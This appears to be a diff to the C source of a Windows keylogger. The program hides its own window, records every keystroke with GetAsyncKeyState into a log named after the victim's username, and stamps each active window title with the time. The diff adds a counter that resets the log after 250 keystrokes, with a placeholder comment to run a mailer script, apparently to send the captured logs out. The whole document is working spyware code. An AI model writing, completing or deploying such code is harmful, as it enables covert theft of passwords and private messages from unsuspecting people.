@@ -4,12 +4,15 @@
 #include <time.h>
 #include <windows.h>
 
-#define BUF_SIZE 256
+// GLOBALS
+#define BUF_SIZE 256 // general purpose for buffers
+int keystroke_count; // rough tracking for size of logfile
 
 // FUNCTION DECLARATIONS //
+char* GetTime();
 void HideWindow();
-void CreateLogfile(char* filename);
-void GetCurrentWindow(char* window, char* new_window, FILE* logfile);
+void InitLogfile(char* filename);
+void GetCurrentWindow(char* window, char* new_window, FILE* logfile, int init_logfile);
 void KeystrokeHandler(short key, FILE* logfile);
 
 // MAIN FUNCTION //
@@ -23,10 +26,12 @@ int main(){
     HWND foreground = GetForegroundWindow();
     GetWindowText(foreground, window, BUF_SIZE);
 
-    // create logfile filename
+    // initialize logfile and keystrokes
     char filename[BUF_SIZE];
-    CreateLogfile(filename);
+    InitLogfile(filename);
+    keystroke_count = 0;
 
+    // active program process
     while(1){
 
         Sleep(10); // reduce CPU usage
@@ -38,12 +43,21 @@ int main(){
             // where -32767 means key is pressed
             if(GetAsyncKeyState(key) == -32767){
 
-                // open/create keylog file then handle keystroke
+                // open keylog file then handle keystroke
                 FILE* logfile;
                 logfile = fopen(filename, "a");
-                GetCurrentWindow(window, new_window, logfile);
+                GetCurrentWindow(window, new_window, logfile, 0);
                 KeystrokeHandler(key, logfile);
+                keystroke_count++;
                 fclose(logfile);
+
+                // once logfile large enough, execute mailer
+                if(keystroke_count >= 250){
+                    //Execute mailer.py
+                    
+                    keystroke_count = 0;
+                    InitLogfile(filename);
+                }
             }
         }
     }
@@ -51,6 +65,12 @@ int main(){
 }
 
 // FUNCTION DEFINITIONS //
+
+// get current time
+char* GetTime(){
+    time_t curr_time = time(NULL);
+    return ctime(&curr_time);
+}
 
 // hides the executable window
 void HideWindow(){
@@ -60,34 +80,44 @@ void HideWindow(){
     ShowWindow(stealth, 0); // set to 0 to not display
 }
 
-// develops the filename of the logfile based on victim's current user
-void CreateLogfile(char* filename){
+// initialize logfile filename and header
+void InitLogfile(char* filename){
+    // develop filename based on victim's current user
     char username[BUF_SIZE+1];
     DWORD len = BUF_SIZE+1;
     GetUserName(username, &len);
-    sprintf(filename, "%s_LOG.txt", username);
+    sprintf(filename, "%s_log.txt", username);
 
-    // initialize logfile upon execution
-    FILE* logfile = fopen(filename, "a");
-    fputs("BEGIN LOGGING...", logfile);
+    // initialize logfile and window handle, then print to file
+    FILE* logfile = fopen(filename, "w");
+    char window[BUF_SIZE];
+    HWND foreground = GetForegroundWindow();
+    GetWindowText(foreground, window, BUF_SIZE);
+    GetCurrentWindow(window, window, logfile, 1);
     fclose(logfile);
 }
 
 // get the current working window of the user
-void GetCurrentWindow(char* window, char* new_window, FILE* logfile){
+void GetCurrentWindow(char* window, char* new_window, FILE* logfile, int init_logfile){
     HWND new_foreground = GetForegroundWindow();
     GetWindowText(new_foreground, window, BUF_SIZE);
     
+    // display current window and time for clean logfile instance
+    if(init_logfile == 1){
+        fputs("BEGIN LOGGING...", logfile);
+        fprintf(logfile, "\n\nWINDOW: %s\nTIME: %s", new_window, GetTime());
+        fflush(logfile);
+        return;
+    }
+
     // check if window has changed/updated
     if(strcmp(window, new_window)){
         strncpy(new_window, window, BUF_SIZE);
 
-        // if changed/updated, get display current window and time
+        // if changed/updated, display current window and time
         if(!strcmp(window, new_window) && strcmp(window, "")){
-            time_t curr_time = time(NULL);
-            char* curr_time_str = ctime(&curr_time);
-
-            fprintf(logfile, "\n\nWINDOW: %s\nTIME: %s", new_window, curr_time_str);
+            keystroke_count+=100; // account for avg length of header
+            fprintf(logfile, "\n\nWINDOW: %s\nTIME: %s", new_window, GetTime());
             fflush(logfile);
         }
     }
